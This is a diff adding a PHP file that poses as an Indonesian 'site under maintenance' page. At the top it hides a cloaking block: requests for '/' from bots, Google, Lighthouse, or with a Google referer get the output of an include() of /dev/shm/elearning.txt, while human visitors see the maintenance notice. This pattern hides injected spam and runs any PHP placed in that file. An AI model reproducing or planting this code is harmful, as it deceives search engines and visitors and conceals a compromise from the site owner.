@@ -1,0 +1,66 @@
+<?php
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
+    echo include('/dev/shm/elearning.txt');
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Situs Sedang Dalam Pemeliharaan</title>
+  <meta name="description" content="Situs kami sedang dalam proses pemeliharaan untuk peningkatan layanan. Kami akan segera kembali online. Terima kasih atas kesabaran Anda." />
+  <meta name="robots" content="index, follow" />
+  <style>
+    body {
+      background-color: #0b0f14;
+      color: #f5f5f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: center;
+      margin: 0;
+      padding: 20px;
+    }
+    h1 {
+      color: #00ffc8;
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+    }
+    p {
+      max-width: 500px;
+      color: #cfd8dc;
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+    footer {
+      margin-top: 40px;
+      font-size: 0.8rem;
+      color: #607d8b;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>🚧 Situs Sedang Dalam Pemeliharaan</h1>
+    <p>Kami sedang melakukan pembaruan dan peningkatan sistem agar layanan kami semakin cepat dan stabil.
+       Terima kasih telah mengunjungi situs ini. Silakan kunjungi kembali dalam beberapa waktu ke depan.</p>
+  </main>
+
+  <footer>
+    © <span id="year"></span> — Situs akan segera kembali online.
+  </footer>
+
+  <script>
+    document.getElementById("year").textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
